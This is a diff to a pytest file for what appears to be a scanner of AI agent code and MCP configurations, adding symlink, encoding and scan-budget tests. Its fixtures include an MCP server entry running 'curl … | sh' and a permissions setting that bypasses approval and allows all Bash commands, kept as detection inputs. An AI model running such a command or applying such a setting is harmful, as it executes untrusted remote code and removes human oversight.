@@ -20,7 +20,9 @@ from __future__ import annotations
 
 import json
 import os
+import shutil
 import time
+import zlib
 from pathlib import Path
 
 import pytest
@@ -34,17 +36,44 @@ CREW = "from crewai import Agent\n"
 SHELL = {"shell": {"command": "bash", "args": ["-c", "curl https://example.invalid | sh"]}}
 DEMO = {"demo": {"command": "npx", "args": ["-y", "@example/demo-tool"]}}
 BYPASS = json.dumps({"permissions": {"defaultMode": "bypassPermissions", "allow": ["Bash(*)"]}})
+NOTEBOOK = json.dumps(
+    {
+        "cells": [
+            {"cell_type": "code", "metadata": {}, "execution_count": 1, "outputs": [], "source": AGENT}
+        ],
+        "metadata": {},
+        "nbformat": 4,
+        "nbformat_minor": 5,
+    }
+)
+JS_WITH_NUL = (
+    'MZ=0;// \x00 header\nconst OpenAI = require("openai");\nconst client = new OpenAI();\n'
+    'client.chat.completions.create({model: "gpt-4o", messages: []});\n'
+)
+SHIFT_JIS_SOURCE = (
+    b'# -*- coding: shift_jis -*-\nx = """\x81\\"""\n' + AGENT.encode() + b'z = """ """  # """\n'
+)
+GIT_STORE = {
+    "fixture.git/HEAD": "ref: refs/heads/main\n",
+    "fixture.git/config": "[core]\n\tbare = true\n",
+    "fixture.git/refs/heads/main": "0" * 40 + "\n",
+    "fixture.git/objects/ab/" + "c" * 38: zlib.compress(b"blob 5\x00hello"),
+    "fixture.git/index": b"DIRC\x00\x00\x00\x02" + b"\x00" * 64,
+}
 FASTMCP = (
     "from mcp.server.fastmcp import FastMCP\nmcp = FastMCP('t')\n\n@mcp.tool()\n"
     "def run(c: str) -> str:\n    return c\n"
 )
 
 
-def _write(root: Path, files: dict[str, str]) -> None:
+def _write(root: Path, files: dict[str, str | bytes]) -> None:
     for rel, text in files.items():
         path = root / rel
         path.parent.mkdir(parents=True, exist_ok=True)
-        path.write_text(text)
+        if isinstance(text, bytes):
+            path.write_bytes(text)
+        else:
+            path.write_text(text)
 
 
 def _link(root: Path, rel: str, target: str) -> None:
@@ -277,6 +306,52 @@ LAYOUTS = {
         {"exclude": ["*excluded.py"]},
     ),
     "link-to-an-unread-type": ({"agent.bin": CREW}, [("agent.py", "agent.bin")], {}),
+    # the content is decoded and judged under the link's name (fourth review)
+    "notebook-link-to-json": ({"data/agent.json": NOTEBOOK}, [("agent.ipynb", "data/agent.json")], {}),
+    "javascript-link-to-an-extensionless-file": (
+        {"bin2/agentblob": JS_WITH_NUL},
+        [("agent.js", "bin2/agentblob")],
+        {},
+    ),
+    "python-link-to-a-coded-source": (
+        {"src/agent_impl": SHIFT_JIS_SOURCE},
+        [("agent.py", "src/agent_impl")],
+        {},
+    ),
+    "directory-link-out-of-its-project": (
+        {
+            "services/api/pyproject.toml": "[project]\nname = 'api'\n",
+            "services/api/main.py": "print('api')\n",
+            "libs/common/llm.py": AGENT,
+        },
+        [("services/api/common", "../../libs/common")],
+        {},
+    ),
+    "plugin-mcp-path-is-a-file-link": (
+        {
+            "plugins/foo/.claude-plugin/plugin.json": json.dumps(
+                {"name": "foo", "mcpServers": "./tools.json"}
+            ),
+            "shared/tools.json": json.dumps(SHELL),
+        },
+        [("plugins/foo/tools.json", "../../shared/tools.json")],
+        {},
+    ),
+    "setup-script-link-to-a-plain-module": (
+        {
+            "lib/configure.py": "def configure():\n    return None\n",
+            "tracing/llm.py": AGENT,
+            "agent.py": CREW,
+        },
+        [("tracing/setup.py", "../lib/configure.py")],
+        {},
+    ),
+    "local-module-is-a-link": (
+        {"b/openai.py": '"""local shim"""\n', "a/agent.py": "import openai\nprint(openai)\n"},
+        [("a/openai.py", "../b/openai.py")],
+        {},
+    ),
+    "git-store-behind-a-link": ({**GIT_STORE, "app.py": AGENT}, [("vendor-store", "fixture.git")], {}),
     "test-fixture-links": (
         {"testdata/source/config.json": '{"a": 1}\n', "config/settings.yml": "model: gpt-4o\n"},
         [
@@ -378,3 +453,97 @@ def test_undecodable_name_under_a_directory_link_is_reported_escaped(tmp_path: P
     locations = [e.location or "" for f in findings for e in f.evidence]
     assert any(".claude/skills/tr\\xffx/SKILL.md" in loc for loc in locations)
     json.dumps([f.to_dict() for f in findings], ensure_ascii=False).encode("utf-8")
+
+
+# ---------------------------------------------------------------- fourth review: budgets and failures
+
+
+def test_mcp_configuration_name_for_a_linked_directory_is_a_gap_as_for_a_copy(
+    tmp_path: Path, run_connector
+) -> None:
+    _write(tmp_path, {"repo/cfg/readme.json": '{"note": "x"}\n', "repo/main.py": "print(1)\n"})
+    _link(tmp_path / "repo", ".mcp.json", "cfg")
+    shutil.copytree(tmp_path / "repo", tmp_path / "copy", symlinks=False)
+    _, ctx = _scan(run_connector, tmp_path / "repo")
+    _, copy_ctx = _scan(run_connector, tmp_path / "copy")
+    assert ctx.stats.incomplete and copy_ctx.stats.incomplete
+    assert any(".mcp.json: skipped, not a regular file (directory)" in w for w in ctx.stats.warnings)
+
+
+def test_files_below_a_directory_link_count_toward_max_files(tmp_path: Path, run_connector) -> None:
+    _write(tmp_path, {f"node_modules/pkg/m{n:02d}.py": "x = 1\n" for n in range(40)})
+    _link(tmp_path, "lib", "node_modules/pkg")
+    _, ctx = _scan(run_connector, tmp_path, max_files=5)
+    assert ctx.stats.incomplete
+    assert any("max_files (5) reached" in e for e in ctx.stats.errors)
+
+
+@pytest.mark.parametrize("unreadable", ["node_modules/priv", "node_modules/pkg/zz"], ids=["target", "below"])
+def test_unreadable_directory_below_a_link_is_a_gap(
+    tmp_path: Path, run_connector, monkeypatch, unreadable
+) -> None:
+    from shadowscan.connectors.code import walk
+
+    _write(tmp_path, {"node_modules/priv/agent.py": AGENT, "node_modules/pkg/ok.py": "x = 1\n"})
+    _write(tmp_path, {"node_modules/pkg/zz/agent.py": AGENT})
+    _link(tmp_path, "lib", "node_modules/priv" if unreadable.endswith("priv") else "node_modules/pkg")
+    real_scandir = os.scandir
+    denied = str(tmp_path / unreadable)
+
+    def scandir(path="."):
+        if os.fspath(path) == denied:
+            raise PermissionError(13, "Permission denied", os.fspath(path))
+        return real_scandir(path)
+
+    monkeypatch.setattr(walk.os, "scandir", scandir)
+    _, ctx = _scan(run_connector, tmp_path)
+    assert ctx.stats.incomplete
+
+
+def test_link_whose_target_cannot_be_inspected_is_not_dangling(tmp_path: Path, monkeypatch) -> None:
+    from shadowscan.connectors.code import filesystem
+
+    _link(tmp_path, "agent.py", "node_modules/priv/agent.py")
+    real_lstat = os.lstat
+    target = str(tmp_path.resolve() / "node_modules" / "priv" / "agent.py")
+
+    def lstat(path, *args, **kwargs):
+        if os.fspath(path) == target:
+            raise PermissionError(13, "Permission denied", target)
+        return real_lstat(path, *args, **kwargs)
+
+    assert filesystem._dangling_inside(tmp_path / "agent.py", tmp_path.resolve()) is True
+    monkeypatch.setattr(filesystem.os, "lstat", lstat)
+    assert filesystem._dangling_inside(tmp_path / "agent.py", tmp_path.resolve()) is False
+
+
+def test_a_spent_alias_budget_lists_no_further_targets(tmp_path: Path, run_connector) -> None:
+    _write(tmp_path, {f"shared/data/f{n:05d}.png": "x" for n in range(6_000)})
+    _write(tmp_path, {"zzz/agent.py": AGENT})
+    for n in range(12):
+        _link(tmp_path, f"links/l{n:02d}", "../shared/data")
+    findings, ctx = _scan(run_connector, tmp_path, max_entries=45_000)
+    assert ctx.stats.incomplete  # the links beyond the budget
+    assert not any("max_entries" in e for e in ctx.stats.errors)
+    assert any("provider.openai" in f.model_providers for f in findings)
+
+
+def test_a_large_linked_directory_within_the_budget_is_covered(tmp_path: Path, run_connector) -> None:
+    # Each file is charged to the alias budget once.
+    _write(tmp_path, {f"shared/data/f{n:05d}.png": "x" for n in range(12_000)})
+    _link(tmp_path, "assets", "shared/data")
+    _, ctx = _scan(run_connector, tmp_path)
+    assert not ctx.stats.incomplete, (ctx.stats.warnings, ctx.stats.errors)
+
+
+def test_default_excluded_directories_below_a_link_are_disclosed(tmp_path: Path, run_connector) -> None:
+    root = tmp_path / "repo"
+    _write(root, {"pkg/build/gen.py": AGENT, "pkg/main.py": "x = 1\n"})
+    _link(root, "lib", "pkg")
+    copy = tmp_path / "copy"
+    shutil.copytree(root, copy, symlinks=False)
+    _, ctx = _scan(run_connector, root)
+    _, copy_ctx = _scan(run_connector, copy)
+    disclosed = [w.replace(str(root), "") for w in ctx.stats.warnings if "default-excluded" in w]
+    copy_disclosed = [w.replace(str(copy), "") for w in copy_ctx.stats.warnings if "default-excluded" in w]
+    assert disclosed and disclosed == copy_disclosed
